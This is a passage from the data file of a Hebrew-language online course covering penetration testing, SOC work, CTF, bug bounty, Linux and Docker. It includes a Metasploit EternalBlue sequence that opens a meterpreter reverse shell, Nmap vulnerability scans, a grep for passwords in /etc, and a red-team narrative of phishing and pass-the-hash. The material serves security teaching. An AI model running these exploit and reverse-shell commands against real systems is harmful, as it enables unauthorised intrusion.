  <text x="245" y="50" text-anchor="middle" font-size="7" fill="#94a3b8">Pivot, Persist</text>
  <line x1="275" y1="40" x2="285" y2="40" stroke="#64748b" stroke-width="1.5" marker-end="url(#a)"/>
  <rect x="285" y="20" width="70" height="40" rx="5" fill="#1e293b" stroke="#0891b2"/>
  <text x="320" y="37" text-anchor="middle" font-size="8" fill="#7dd3fc">5. Report</text>
  <text x="320" y="50" text-anchor="middle" font-size="7" fill="#94a3b8">עדיפויות + fix</text>
  <defs><marker id="a" markerWidth="6" markerHeight="6" refX="3" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#64748b"/></marker></defs>
</svg>
</div>
<table class="content-table">
  <tr><th>שלב</th><th>מה עושים</th><th>כלים</th></tr>
  <tr><td>Recon פסיבי</td><td>WHOIS, Google dorking, LinkedIn, Shodan</td><td>theHarvester, maltego</td></tr>
  <tr><td>Recon אקטיבי</td><td>DNS enumeration, port scan, OS fingerprint</td><td>Nmap, Masscan</td></tr>
  <tr><td>Vulnerability Scan</td><td>CVE detection, misconfiguration</td><td>Nessus, OpenVAS, Nuclei</td></tr>
  <tr><td>Exploitation</td><td>ניצול CVEs, web vulnerabilities</td><td>Metasploit, Burp Suite, SQLmap</td></tr>
  <tr><td>Post-Exploitation</td><td>Privilege escalation, lateral movement, data access</td><td>Mimikatz, BloodHound, Cobalt Strike</td></tr>
  <tr><td>Reporting</td><td>Executive summary + Technical findings + CVSS scores</td><td>—</td></tr>
</table>
</div>`
      },
      {
        type: "explanation",
        title: "כלי Pentest עיקריים",
        content: `<div dir="rtl">
<h2>ארגז הכלים של ה-Pentester</h2>
<h3>Nmap — לב הסריקה</h3>
<div class="code-preview"><pre><code># סריקה בסיסית
nmap -sV -O 192.168.1.1

# סריקה מלאה אגרסיבית
nmap -A -T4 192.168.1.0/24

# NSE scripts — בדיקות ספציפיות
nmap --script vuln 192.168.1.1
nmap --script http-enum 192.168.1.1

# סריקת UDP (איטית אבל חשובה)
nmap -sU -p 53,161,500 192.168.1.1</code></pre></div>
<h3>Burp Suite — Web Application Testing</h3>
<div class="code-preview"><pre><code># Burp Suite Community/Pro:
# Proxy — יירוט ושינוי HTTP requests
# Repeater — שליחת requests ידנית שוב ושוב
# Intruder — brute force, fuzzing
# Scanner (Pro) — automatic vulnerability scan
# Decoder — base64, URL encode/decode</code></pre></div>
<h3>Metasploit — Framework לExploitation</h3>
<div class="code-preview"><pre><code">msfconsole
search ms17-010          # EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
run</code></pre></div>
<p><strong>Kali Linux</strong> מגיעה עם כל הכלים הללו מותקנים מראש — ה-distro הסטנדרטי לpentesting.</p>
</div>`
      },
      {
        type: "story",
        title: "הסיפור: Red Team מול בנק",
        content: `<div dir="rtl">
<h2>יום בחיי Red Teamer — כשנכנסים בלי שיודעים</h2>
<p>חברת pentesting גדולה קיבלה הרשאה לבצע Red Team engagement מלא — כולל Physical intrusion וSocial Engineering. הקורבן: בנק בינלאומי. Duration: 2 שבועות.</p>
<p><strong>שלב 1 — Recon פסיבי (3 ימים):</strong> LinkedIn חשף 15 עובדים בIT. GitHub של אחד מהם — credentials ישנים שלא הוסרו לprod DB. Shodan חשף VPN endpoint עתיקה עם Citrix CVE.</p>
<p><strong>שלב 2 — Initial Access:</strong> Phishing email מותאם אישית לIT manager — "עדכון דחוף ל-VPN client". Payload = Cobalt Strike beacon. קיבלו foothold ב-workstation פנימי.</p>
<p><strong>שלב 3 — Lateral Movement:</strong> BloodHound מיפה את Active Directory. מצאו Service Account עם too much privileges. Pass-the-Hash לDomain Controller. Game over.</p>
<p><strong>הממצאים בדוח:</strong> Criticals: 3 (Citrix CVE, weak AD, credentials in GitHub). Highs: 7. בסך הכל 47 findings.</p>
<p><strong>הלקח:</strong> הבנק האמין שהוא מוגן. CISO אמר: "שלמנו $500K על firewalls". הכניסה הייתה דרך email זדוני ו-LinkedIn. Technology לא מגן על human error.</p>
</div>`
      }
    ]
  },
  {
    id: 105,
    title: "Blue Team ו-SOC",
    pages: [
      {
        type: "explanation",
        title: "Defense in Depth",
        content: `<div dir="rtl">
<h2>Defense in Depth — שכבות הגנה</h2>
<p>אסטרטגיית Defense in Depth: אין שכבה אחת שמספיקה. כל שכבה מניחה שהשכבה שלפניה כשלה.</p>
<div class="diagram-container">
<svg viewBox="0 0 360 150" class="content-diagram">
  <ellipse cx="180" cy="105" rx="170" ry="40" fill="#0f172a" stroke="#64748b"/>
  <text x="180" y="109" text-anchor="middle" font-size="9" fill="#94a3b8">Physical Security</text>
  <ellipse cx="180" cy="98" rx="145" ry="33" fill="#0f172a" stroke="#475569"/>
  <text x="180" y="102" text-anchor="middle" font-size="9" fill="#64748b">Network Perimeter (Firewall)</text>
  <ellipse cx="180" cy="90" rx="120" ry="27" fill="#0f172a" stroke="#334155"/>
  <text x="180" y="94" text-anchor="middle" font-size="9" fill="#94a3b8">Network Segmentation (VLAN)</text>
  <ellipse cx="180" cy="82" rx="95" ry="21" fill="#1e293b" stroke="#3b82f6" stroke-width="1.5"/>
  <text x="180" y="86" text-anchor="middle" font-size="9" fill="#93c5fd">Endpoint Protection (EDR)</text>
  <ellipse cx="180" cy="72" rx="70" ry="16" fill="#1e3a5f" stroke="#60a5fa" stroke-width="1.5"/>
  <text x="180" y="76" text-anchor="middle" font-size="9" fill="#7dd3fc">Application Security (WAF)</text>
  <ellipse cx="180" cy="60" rx="48" ry="12" fill="#1e3a5f" stroke="#818cf8" stroke-width="1.5"/>
  <text x="180" y="64" text-anchor="middle" font-size="8" fill="#a5b4fc">Data Encryption</text>
  <ellipse cx="180" cy="47" rx="28" ry="9" fill="#4c1d95" stroke="#a78bfa" stroke-width="1.5"/>
  <text x="180" y="51" text-anchor="middle" font-size="7" fill="#ddd6fe">IAM + MFA</text>
  <text x="180" y="22" text-anchor="middle" font-size="10" fill="#e2e8f0" font-weight="bold">Defense in Depth</text>
</svg>
</div>
<p>כל שכבה מגנה מפני vector שונה. גם אם תוקף עקף Firewall, EDR יכול לזהות את הmalware. גם אם הmalware רץ, Encryption מגן על הdata.</p>
</div>`
      },
      {
        type: "explanation",
        title: "SIEM ו-Incident Response",
        content: `<div dir="rtl">
<h2>SIEM — עיני ה-SOC</h2>
<p>SIEM (Security Information and Event Management) מאגד logs מכל המערכות ומנתח בזמן אמת:</p>
<table class="content-table">
  <tr><th>כלי SIEM</th><th>מאפיין</th></tr>
  <tr><td>Splunk</td><td>מסחרי, החזק ביותר, SPL query language</td></tr>
  <tr><td>Elastic SIEM (ELK)</td><td>Open source, Kibana dashboards, KQL</td></tr>
  <tr><td>Microsoft Sentinel</td><td>Cloud-native Azure, KQL, AI correlation</td></tr>
  <tr><td>IBM QRadar</td><td>Enterprise, AQL, behavioral analytics</td></tr>
</table>
<h3>Incident Response Lifecycle (NIST)</h3>
<ol>
<li><strong>Preparation:</strong> IR plan, playbooks, team roles, tools ready</li>
<li><strong>Detection & Analysis:</strong> Alert fires → triage → scope assessment</li>
<li><strong>Containment:</strong> Isolate affected systems, preserve evidence</li>
<li><strong>Eradication:</strong> Remove malware, patch vulnerability, rotate credentials</li>
<li><strong>Recovery:</strong> Restore from clean backup, monitor closely</li>
<li><strong>Lessons Learned:</strong> Post-mortem, update playbooks, train team</li>
</ol>
<div class="code-preview"><pre><code"># Splunk — hunting lateral movement
index=windows EventCode=4624
  LogonType=3 NOT (src_ip="127.0.0.1")
| stats count by src_ip, dest_ip, user
| where count > 10
| sort -count</code></pre></div>
</div>`
      },
      {
        type: "story",
        title: "הסיפור: SOC Analyst מוצא APT",
        content: `<div dir="rtl">
<h2>3 בלילה — Alert שמשנה הכל</h2>
<p>SOC analyst בחברת ביטוח גדולה מקבלת alert ב-3:17AM: "unusual volume of LDAP queries from workstation WS-0342". Rule: workstation שלחה 2,000+ LDAP queries תוך דקה — נורמלי הוא 0-5.</p>
<p><strong>Triage (10 דקות ראשונות):</strong></p>
<ul>
<li>בדקה ב-Splunk: WS-0342 שייכת לאנליסט פיננסי שנמצא בחופשה</li>
<li>Login events: מחשב הכניסה logon ב-02:50AM — חריג מאוד</li>
<li>Source IP של הlogin: 94.x.x.x — IP רוסי (בדיקה ב-VirusTotal: C2 server ידוע)</li>
</ul>
<p><strong>Containment (20 דקות):</strong> מיד ניתקה WS-0342 מהרשת. נחסמה הכניסה לחשבון. Forensic image של הדיסק לפני כל שינוי.</p>
<p><strong>Investigation:</strong> Malware התקין backdoor 3 שבועות קודם (phishing email שלא זוהה בזמן). 3 שבועות של LDAP enumeration ו-BloodHound mapping — התוקף מיפה את כל ה-AD. לא הספיק לPivot לDomain Controller.</p>
<p><strong>הלקח:</strong> ה-SIEM rule הפשוטה של LDAP queries — עצרה מתקפה שהייתה יכולה להיות catastrophic. הgame changer היה ה-detection, לא ה-prevention.</p>
</div>`
      }
    ]
  },
  {
    id: 106,
    title: "CTF ו-Bug Bounty",
    pages: [
      {
        type: "explanation",
        title: "CTF — Capture The Flag",
        content: `<div dir="rtl">
<h2>CTF — הדרך הכיפית ללמוד סייבר</h2>
<p>CTF הוא תחרות בה פותרים אתגרי אבטחה כדי למצוא "flag" — מחרוזת מיוחדת שמוכיחה שפתרת.</p>
<table class="content-table">
  <tr><th>קטגוריה</th><th>מה זה</th><th>כלים</th></tr>
  <tr><td>Web</td><td>SQL injection, XSS, SSRF, deserialization</td><td>Burp Suite, sqlmap</td></tr>
  <tr><td>Pwn (Binary)</td><td>Buffer overflow, ROP chains, heap exploitation</td><td>pwndbg, pwntools, gdb</td></tr>
  <tr><td>Crypto</td><td>RSA attacks, AES modes, hash collisions</td><td>Python, SageMath</td></tr>
  <tr><td>Forensics</td><td>ניתוח memory dumps, steganography, PCAP</td><td>Autopsy, Volatility, Wireshark</td></tr>
  <tr><td>Reverse Engineering</td><td>disassembly, decompilation, anti-debug</td><td>Ghidra, IDA, x64dbg</td></tr>
  <tr><td>OSINT</td><td>גילוי מידע ממקורות ציבוריים</td><td>Maltego, theHarvester</td></tr>
</table>
<h3>פלטפורמות לתרגול</h3>
<ul>
<li><strong>HackTheBox</strong> — מכונות לpwn ו-CTF challenges. הכי פופולרי.</li>
<li><strong>TryHackMe</strong> — guided learning paths, מתחילים ידידותי</li>
<li><strong>PicoCTF</strong> — קל יותר, מצוין למתחילים</li>
<li><strong>CTFtime.org</strong> — לוח תחרויות עולמי</li>
<li><strong>PortSwigger Web Academy</strong> — web labs חינמיים</li>
</ul>
</div>`
      },
      {
        type: "explanation",
        title: "Bug Bounty — לקבל תשלום על מציאת חולשות",
        content: `<div dir="rtl">
<h2>Bug Bounty — תעשייה של $1.5B בשנה</h2>
<p>חברות משלמות לחוקרים שמוצאים ומדווחים על חולשות בצורה אחראית (Responsible Disclosure). HackerOne דיווחה ב-2023: researcher אחד הרוויח $4M לאורך הקריירה.</p>
<table class="content-table">
  <tr><th>פלטפורמה</th><th>מי שם</th><th>טווח תשלומים</th></tr>
  <tr><td>HackerOne</td><td>Google, Apple, Microsoft, US DoD</td><td>$100 — $100,000+</td></tr>
  <tr><td>Bugcrowd</td><td>Tesla, Mastercard, Atlassian</td><td>$50 — $50,000</td></tr>
  <tr><td>Intigriti</td><td>חברות אירופיות, NATO</td><td>€100 — €20,000</td></tr>
  <tr><td>Synack</td><td>invitaton-only, US Gov</td><td>גבוה מאוד</td></tr>
</table>
<h3>Vulnerability Classifications ותשלומים</h3>
<ul>
<li><strong>Critical</strong> (RCE, Authentication bypass): $5,000–$100,000+</li>
<li><strong>High</strong> (SQLi, SSRF, IDOR sensitive data): $1,000–$10,000</li>
<li><strong>Medium</strong> (XSS stored, CSRF, info disclosure): $100–$1,000</li>
<li><strong>Low/Info</strong>: $50–$200</li>
</ul>
<h3>Disclosure Process</h3>
<ol>
<li>מצא פגיעות ב-scope מוגדר</li>
<li>תעד את הפגיעות (PoC, screenshots, impact)</li>
<li>שלח דוח דרך הפלטפורמה</li>
<li>חכה לTriaging (24-72 שעות)</li>
<li>Coordinated Disclosure — אל תפרסם לפני שה-vendor תיקן</li>
<li>קבל תשלום + Hall of Fame</li>
</ol>
</div>`
      },
      {
        type: "story",
        title: "הסיפור: מ-CTF ל-$50K ב-Apple",
        content: `<div dir="rtl">
<h2>Hacker בן 20 מוצא RCE ב-Apple — ומקבל $50,000</h2>
<p>2021: Sam Curry, חוקר אבטחה בן 20, וצוות חברים מחליטים לחקור את Apple בצורה שיטתית — לאחר שלמדו Web hacking דרך CTF ו-HackTheBox.</p>
<p>הם סרקו את כל ה-subdomains של apple.com — מצאו subdomain שמריץ instance ישן של emagic (תוכנת מוסיקה שApple רכשה ב-2002). רץ code base ישן ולא מעודכן.</p>
<p>הם מצאו SQL injection שהוביל ל-RCE (Remote Code Execution) מלא על server של Apple. מהserver הצליחו לגשת ל-internal network.</p>
<p><strong>Total findings ב-3 חודשים:</strong> 55 vulnerabilities. 11 criticals. Apple שילמה $289,000 בסך הכל. Report אחד בלבד — $50,000.</p>
<p>Sam פרסם writeup מפורט שהפך viral. כיום הוא בין ה-top researchers ב-HackerOne, עובד full-time על bug bounty, מרוויח מאות אלפי דולרים בשנה.</p>
<p><strong>הלקח:</strong> Bug bounty הוא דמוקרטי — אין דרישות ניסיון, אין CV, אין interview. רק knowledge ועקשנות. הדרך: CTF → PortSwigger Academy → Bugbounty על תוכניות קלות → בניית track record.</p>
</div>`
      }
    ]
  }
]
  },
  {
    id: 'devops',
    title: 'DevOps & Cloud',
    subtitle: 'Linux, Docker, Kubernetes, AWS — תשתיות מודרניות',
    icon: '☁️',
    color: '#22c55e',
    level: 'בינוני–מתקדם',
    chapters: [
  {
    id: 201,
    title: "ניהול Linux",
    pages: [
      {
        type: "explanation",
        title: "היררכיית מערכת הקבצים",
        content: `<div dir="rtl">
<h2>Filesystem Hierarchy Standard (FHS)</h2>
<p>Linux משתמשת בעץ קבצים אחיד שמתחיל בשורש <code>/</code>. כל רכיב במערכת — דיסקים, מכשירים, תהליכים — מיוצג כקובץ.</p>
<div class="diagram-container">
<svg viewBox="0 0 360 120" class="content-diagram">
  <text x="175" y="18" text-anchor="middle" font-size="13" fill="#e2e8f0" font-weight="bold">/</text>
  <line x1="175" y1="22" x2="40" y2="45" stroke="#64748b" stroke-width="1.5"/>
  <line x1="175" y1="22" x2="105" y2="45" stroke="#64748b" stroke-width="1.5"/>
  <line x1="175" y1="22" x2="175" y2="45" stroke="#64748b" stroke-width="1.5"/>
  <line x1="175" y1="22" x2="245" y2="45" stroke="#64748b" stroke-width="1.5"/>
  <line x1="175" y1="22" x2="315" y2="45" stroke="#64748b" stroke-width="1.5"/>
  <rect x="10" y="45" width="58" height="22" rx="4" fill="#1e3a5f"/>
  <text x="39" y="60" text-anchor="middle" font-size="11" fill="#93c5fd">/bin</text>
  <rect x="76" y="45" width="58" height="22" rx="4" fill="#1e3a5f"/>
  <text x="105" y="60" text-anchor="middle" font-size="11" fill="#93c5fd">/etc</text>
  <rect x="146" y="45" width="58" height="22" rx="4" fill="#1e3a5f"/>
  <text x="175" y="60" text-anchor="middle" font-size="11" fill="#93c5fd">/home</text>
  <rect x="216" y="45" width="58" height="22" rx="4" fill="#1e3a5f"/>
  <text x="245" y="60" text-anchor="middle" font-size="11" fill="#93c5fd">/var</text>
  <rect x="286" y="45" width="58" height="22" rx="4" fill="#1e3a5f"/>
  <text x="315" y="60" text-anchor="middle" font-size="11" fill="#93c5fd">/proc</text>
  <line x1="39" y1="67" x2="39" y2="88" stroke="#64748b" stroke-width="1"/>
  <rect x="10" y="88" width="58" height="20" rx="3" fill="#0f2744"/>
  <text x="39" y="101" text-anchor="middle" font-size="10" fill="#7dd3fc">קבצים הרצה</text>
  <line x1="105" y1="67" x2="105" y2="88" stroke="#64748b" stroke-width="1"/>
  <rect x="76" y="88" width="58" height="20" rx="3" fill="#0f2744"/>
  <text x="105" y="101" text-anchor="middle" font-size="10" fill="#7dd3fc">הגדרות מערכת</text>
  <line x1="175" y1="67" x2="175" y2="88" stroke="#64748b" stroke-width="1"/>
  <rect x="146" y="88" width="58" height="20" rx="3" fill="#0f2744"/>
  <text x="175" y="101" text-anchor="middle" font-size="10" fill="#7dd3fc">משתמשים</text>
  <line x1="245" y1="67" x2="245" y2="88" stroke="#64748b" stroke-width="1"/>
  <rect x="216" y="88" width="58" height="20" rx="3" fill="#0f2744"/>
  <text x="245" y="101" text-anchor="middle" font-size="10" fill="#7dd3fc">לוגים/נתונים</text>
  <line x1="315" y1="67" x2="315" y2="88" stroke="#64748b" stroke-width="1"/>
  <rect x="286" y="88" width="58" height="20" rx="3" fill="#0f2744"/>
  <text x="315" y="101" text-anchor="middle" font-size="10" fill="#7dd3fc">תהליכים חיים</text>
</svg>
</div>
<table class="content-table">
  <tr><th>נתיב</th><th>תוכן</th></tr>
  <tr><td><code>/bin</code>, <code>/usr/bin</code></td><td>קבצי הרצה של המערכת והמשתמשים</td></tr>
  <tr><td><code>/etc</code></td><td>קובצי הגדרות של כל השירותים</td></tr>
  <tr><td><code>/var/log</code></td><td>לוגים של המערכת והאפליקציות</td></tr>
  <tr><td><code>/proc</code>, <code>/sys</code></td><td>ממשק וירטואלי לגרעין Linux</td></tr>
  <tr><td><code>/tmp</code></td><td>קבצים זמניים — נמחקים ברסטרט</td></tr>
  <tr><td><code>/home/user</code></td><td>תיקיית הבית של כל משתמש</td></tr>
</table>
<p><strong>טיפ:</strong> <code>/proc/cpuinfo</code> הוא לא קובץ אמיתי — הגרעין יוצר אותו בזמן אמת כשקוראים אותו.</p>
</div>`
      },
      {
        type: "explanation",
        title: "פקודות חיוניות — ניפוי בעיות",
        content: `<div dir="rtl">
<h2>ארגז הכלים של ה-SysAdmin</h2>
<p>כשמשהו משתבש בפרודקשן, 5 הפקודות האלו הן הראשונות שתפעיל:</p>
<table class="content-table">
  <tr><th>פקודה</th><th>מה היא עושה</th></tr>
  <tr><td><code>ls -lah</code></td><td>רשימת קבצים עם הרשאות, גדלים ותאריכים</td></tr>
  <tr><td><code>grep -r "error" /var/log/</code></td><td>חיפוש רקורסיבי בטקסט — מוצא שגיאות בלוגים</td></tr>
  <tr><td><code>ps aux</code></td><td>כל התהליכים הרצים — CPU, memory, PID</td></tr>
  <tr><td><code>ss -tulnp</code></td><td>פורטים פתוחים ואיזה תהליך מאזין לכל אחד</td></tr>
  <tr><td><code>journalctl -u nginx -f</code></td><td>לוגים בזמן אמת לשירות ספציפי</td></tr>
</table>
<div class="code-preview"><pre><code># מי מאזין על פורט 80?
ss -tulnp | grep :80

# 50 שורות לוג אחרונות של שירות
journalctl -u myapp --no-pager -n 50

# תהליכים הכי כבדים על CPU
ps aux --sort=-%cpu | head -10

# חיפוש קובץ שמכיל "password" (זהירות!)
grep -r --include="*.conf" "password" /etc/

# שימוש בדיסק לכל תיקייה
du -sh /var/log/* | sort -rh | head -10</code></pre></div>
<p><strong>זרימת עבודה מומלצת לניפוי בעיות:</strong></p>
<ol>
  <li>בדוק לוגים: <code>journalctl -xe</code></li>
  <li>בדוק תהליכים: <code>ps aux | grep appname</code></li>
  <li>בדוק פורטים: <code>ss -tulnp | grep PORT</code></li>
  <li>בדוק דיסק: <code>df -h</code> ו-<code>du -sh *</code></li>
  <li>בדוק RAM: <code>free -h</code></li>
</ol>
</div>`
      },
      {
        type: "explanation",
        title: "הרשאות — chmod, chown",
        content: `<div dir="rtl">
<h2>מודל ההרשאות של Linux</h2>
<p>כל קובץ שייך ל<strong>משתמש</strong> ול<strong>קבוצה</strong>, ויש לו 3 סטי הרשאות:</p>
<div class="diagram-container">
<svg viewBox="0 0 360 120" class="content-diagram">
  <rect x="10" y="15" width="340" height="40" rx="6" fill="#1e293b"/>
  <text x="20" y="40" font-size="16" fill="#f1f5f9" font-family="monospace">-  rwx  r-x  r--</text>
  <text x="22" y="58" font-size="9" fill="#94a3b8">סוג</text>
  <text x="50" y="58" font-size="9" fill="#86efac">בעלים</text>
  <text x="100" y="58" font-size="9" fill="#fbbf24">קבוצה</text>
  <text x="148" y="58" font-size="9" fill="#f87171">אחרים</text>
  <rect x="10" y="72" width="100" height="38" rx="5" fill="#14532d"/>
  <text x="60" y="87" text-anchor="middle" font-size="10" fill="#86efac" font-weight="bold">rwx = 7</text>
  <text x="60" y="103" text-anchor="middle" font-size="9" fill="#86efac">r=4, w=2, x=1</text>
  <rect x="120" y="72" width="100" height="38" rx="5" fill="#78350f"/>
  <text x="170" y="87" text-anchor="middle" font-size="10" fill="#fbbf24" font-weight="bold">r-x = 5</text>
  <text x="170" y="103" text-anchor="middle" font-size="9" fill="#fbbf24">קרא + הרץ</text>
  <rect x="230" y="72" width="120" height="38" rx="5" fill="#450a0a"/>
  <text x="290" y="87" text-anchor="middle" font-size="10" fill="#f87171" font-weight="bold">r-- = 4</text>
  <text x="290" y="103" text-anchor="middle" font-size="9" fill="#f87171">קרא בלבד</text>
</svg>
</div>
<div class="code-preview"><pre><code># הצג הרשאות
ls -la /var/www/html/

# chmod — שנה הרשאות (מספרי)
chmod 755 script.sh     # rwxr-xr-x
chmod 644 config.conf   # rw-r--r--
chmod 600 private.key   # rw------- (מפתח SSH!)

# chmod — symbolic
chmod +x deploy.sh      # הוסף הרצה לכולם
chmod u+w,g-w file.txt  # בעלים: הוסף כתיבה, קבוצה: הסר

# chown — שנה בעלות
chown www-data:www-data /var/www/html/
chown -R ubuntu:ubuntu /home/ubuntu/app/

# הרשאות מיוחדות — SUID, SGID, Sticky
chmod +t /tmp           # Sticky bit — רק בעלים מוחק
chmod u+s /usr/bin/sudo # SUID — רץ כבעלים</code></pre></div>
<p><strong>כלל אצבע:</strong> קבצי הגדרה עם סיסמאות — <code>600</code> תמיד. ספריות אינטרנט — <code>755</code>. scripts — <code>755</code>.</p>
</div>`
      },
      {
        type: "explanation",
        title: "systemd — ניהול שירותים",
        content: `<div dir="rtl">
<h2>systemd: init מערכת מודרני</h2>
<p>systemd הוא התהליך הראשון שרץ ב-Linux (PID 1). הוא מנהל את כל השירותים, ה-mount points, ה-timers, ועוד.</p>
<table class="content-table">
  <tr><th>פקודה</th><th>פעולה</th></tr>
  <tr><td><code>systemctl status nginx</code></td><td>מצב שירות — רץ/עצר/שגיאה</td></tr>
  <tr><td><code>systemctl start/stop/restart nginx</code></td><td>שלוט בשירות</td></tr>
  <tr><td><code>systemctl enable nginx</code></td><td>הפעל אוטומטית בבוט</td></tr>
  <tr><td><code>systemctl disable nginx</code></td><td>הסר הפעלה אוטומטית</td></tr>
  <tr><td><code>systemctl list-units --failed</code></td><td>כל השירותים שנכשלו</td></tr>
  <tr><td><code>journalctl -u nginx -since "1h ago"</code></td><td>לוגים של שעה אחרונה</td></tr>
</table>
<div class="code-preview"><pre><code># קובץ unit מותאם אישית
# /etc/systemd/system/myapp.service
[Unit]
Description=My Python App
After=network.target

[Service]
Type=simple
User=ubuntu
WorkingDirectory=/home/ubuntu/app
ExecStart=/home/ubuntu/app/venv/bin/python -m uvicorn main:app
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target

# הפעלה
sudo systemctl daemon-reload
sudo systemctl enable myapp
sudo systemctl start myapp</code></pre></div>
<p><strong>יתרון גדול של systemd:</strong> <code>Restart=on-failure</code> — השירות שלך יקום אוטומטית אחרי קריסה, ללא cron או supervisor.</p>
</div>`
      }
    ]
  },
  {
    id: 202,
    title: "Docker — קונטיינריזציה",
    pages: [
      {
        type: "explanation",
        title: "VM לעומת קונטיינר",
        content: `<div dir="rtl">
<h2>המהפכה של הקונטיינרים</h2>
<p>לפני Docker, כל אפליקציה הצריכה Virtual Machine שלמה — גרעין, OS מלא, RAM נפרד. בזבוז עצום.</p>
<div class="diagram-container">
<svg viewBox="0 0 360 120" class="content-diagram">
  <rect x="5" y="5" width="165" height="110" rx="6" fill="#1e293b" stroke="#475569" stroke-width="1"/>
  <text x="87" y="20" text-anchor="middle" font-size="10" fill="#94a3b8">Virtual Machines</text>
  <rect x="12" y="25" width="70" height="55" rx="4" fill="#0f2744"/>
  <text x="47" y="40" text-anchor="middle" font-size="8" fill="#7dd3fc">App A</text>
  <rect x="15" y="43" width="64" height="14" rx="2" fill="#1e3a5f"/>
  <text x="47" y="53" text-anchor="middle" font-size="7" fill="#93c5fd">Guest OS</text>
  <rect x="15" y="58" width="64" height="14" rx="2" fill="#1e3a5f"/>
  <text x="47" y="68" text-anchor="middle" font-size="7" fill="#93c5fd">Hypervisor</text>
  <rect x="90" y="25" width="70" height="55" rx="4" fill="#0f2744"/>
  <text x="125" y="40" text-anchor="middle" font-size="8" fill="#7dd3fc">App B</text>
  <rect x="93" y="43" width="64" height="14" rx="2" fill="#1e3a5f"/>
  <text x="125" y="53" text-anchor="middle" font-size="7" fill="#93c5fd">Guest OS</text>
  <rect x="93" y="58" width="64" height="14" rx="2" fill="#1e3a5f"/>
  <text x="125" y="68" text-anchor="middle" font-size="7" fill="#93c5fd">Hypervisor</text>
  <rect x="12" y="83" width="148" height="25" rx="3" fill="#0c1a2e"/>
  <text x="86" y="99" text-anchor="middle" font-size="8" fill="#60a5fa">Hardware</text>

  <rect x="188" y="5" width="167" height="110" rx="6" fill="#1e293b" stroke="#475569" stroke-width="1"/>
  <text x="271" y="20" text-anchor="middle" font-size="10" fill="#94a3b8">Containers</text>
  <rect x="195" y="25" width="68" height="30" rx="4" fill="#14532d"/>
  <text x="229" y="44" text-anchor="middle" font-size="8" fill="#86efac">Container A</text>
  <rect x="271" y="25" width="68" height="30" rx="4" fill="#14532d"/>
  <text x="305" y="44" text-anchor="middle" font-size="8" fill="#86efac">Container B</text>
  <rect x="195" y="60" width="144" height="15" rx="3" fill="#1e3a5f"/>
  <text x="267" y="71" text-anchor="middle" font-size="7" fill="#93c5fd">Docker Engine (משתף גרעין)</text>
  <rect x="195" y="78" width="144" height="30" rx="3" fill="#0c1a2e"/>
  <text x="267" y="97" text-anchor="middle" font-size="8" fill="#60a5fa">Host OS + Hardware</text>
</svg>
</div>
<table class="content-table">
  <tr><th>מאפיין</th><th>VM</th><th>Container</th></tr>
  <tr><td>גודל</td><td>GBs</td><td>MBs</td></tr>
  <tr><td>זמן הפעלה</td><td>דקות</td><td>שניות / מילישניות</td></tr>
  <tr><td>גרעין</td><td>נפרד לכל VM</td><td>משותף עם Host</td></tr>
  <tr><td>בידוד</td><td>חזק מאוד</td><td>חזק (namespaces)</td></tr>
  <tr><td>ביצועים</td><td>תקורה גבוהה</td><td>כמעט כמו native</td></tr>
</table>
<p>Docker משתמש ב-<strong>namespaces</strong> (בידוד) ו-<strong>cgroups</strong> (הגבלת משאבים) של Linux kernel.</p>
</div>`
      },
      {
        type: "explanation",
        title: "Dockerfile — בניית image",
        content: `<div dir="rtl">
<h2>Dockerfile: הוראות הבנייה</h2>
<p>Dockerfile הוא קובץ טקסט שמגדיר שכבה-אחר-שכבה איך לבנות image. כל פקודה = שכבה חדשה ב-filesystem.</p>
<div class="code-preview"><pre><code># Dockerfile לאפליקציית Python/FastAPI
FROM python:3.12-slim

# מגדיר תיקיית עבודה בתוך הקונטיינר
WORKDIR /app

# מעתיק requirements תחילה (cache optimization!)
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# מעתיק שאר הקוד
COPY . .

# פורט שהאפליקציה מאזינה עליו (תיעוד בלבד)
EXPOSE 8000

# משתנה סביבה
ENV PYTHONUNBUFFERED=1

# הפקודה שתרוץ בהפעלת הקונטיינר
CMD ["uvicorn", "app.main:app", "--host", "0.0.0.0", "--port", "8000"]</code></pre></div>
<table class="content-table">
  <tr><th>פקודה</th><th>תפקיד</th></tr>
  <tr><td><code>FROM</code></td><td>image בסיס — מריץ מ-Docker Hub</td></tr>
  <tr><td><code>RUN</code></td><td>מריץ פקודה shell בזמן בנייה → שכבה חדשה</td></tr>
  <tr><td><code>COPY</code></td><td>מעתיק קבצים מה-host לתוך image</td></tr>
  <tr><td><code>ENV</code></td><td>משתנה סביבה שנשאר ב-image</td></tr>
  <tr><td><code>CMD</code></td><td>פקודה ברירת מחדל להרצה (ניתן לעקוף)</td></tr>
  <tr><td><code>ENTRYPOINT</code></td><td>פקודה קבועה — לא ניתן לעקוף</td></tr>
</table>
<div class="code-preview"><pre><code># בנייה והרצה
docker build -t myapp:latest .
docker run -d -p 8000:8000 --name myapp myapp:latest

# בדיקה
docker logs myapp -f
docker exec -it myapp bash</code></pre></div>
</div>`
      },
      {
        type: "explanation",
        title: "Docker Compose — multi-container",
        content: `<div dir="rtl">
<h2>Docker Compose: כמה שירותים יחד</h2>
<p>בפרויקטים אמיתיים יש backend + database + cache + nginx. Compose מאפשר להגדיר הכל בקובץ YAML אחד.</p>
<div class="code-preview"><pre><code># docker-compose.yml
version: '3.8'

services:
  web:
    build: .
    ports:
      - "8000:8000"
    environment:
      - DATABASE_URL=postgresql://user:pass@db:5432/mydb
      - REDIS_URL=redis://redis:6379
    depends_on:
      - db
      - redis
    volumes:
      - ./data:/app/data

  db:
    image: postgres:16
    environment:
      POSTGRES_USER: user
      POSTGRES_PASSWORD: pass
      POSTGRES_DB: mydb
    volumes:
      - postgres_data:/var/lib/postgresql/data

  redis:
    image: redis:7-alpine
    command: redis-server --appendonly yes

  nginx:
    image: nginx:alpine
    ports:
      - "80:80"
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf
    depends_on:
      - web

volumes:
  postgres_data:</code></pre></div>
<div class="code-preview"><pre><code># פקודות Compose
docker compose up -d          # הפעל הכל ברקע
docker compose down           # עצור והרס קונטיינרים
docker compose logs web -f    # לוגים של שירות
docker compose ps             # סטטוס
docker compose exec db psql -U user mydb  # כנס ל-DB</code></pre></div>
